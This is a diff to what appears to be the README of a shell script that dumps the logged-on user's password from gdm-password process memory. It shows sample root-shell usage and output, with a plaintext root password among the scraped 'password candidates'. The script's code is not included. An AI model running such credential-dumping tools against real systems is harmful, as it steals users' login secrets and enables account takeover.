@@ -2,7 +2,7 @@
 Dumps the currently logged on users' password from gdm-password process memory.
 
 ```
-root@pwnd:~# ./gdmpassword.sh
+root@pwnd:~# ./gdmpasswd.sh 
           __                                               __ 
 .-----.--|  |.--------.-----.---.-.-----.-----.--.--.--.--|  |
 |  _  |  _  ||        |  _  |  _  |__ --|__ --|  |  |  |  _  |
@@ -10,5 +10,24 @@ root@pwnd:~# ./gdmpassword.sh
 |_____|               |__|                                    
 
 USERNAME: root 
-PASSWORD: r00tp@ss89!
+
+PASSWORD CANDIDATES:
+
+close
+counts.User'
+r00tP@ss!89
+files
+group
+hosts
+myhostname
+netgroup
+networks
+passwd
+protocols
+publickey
+services
+shadow
+
+root@pwnd:~# 
+
 ```
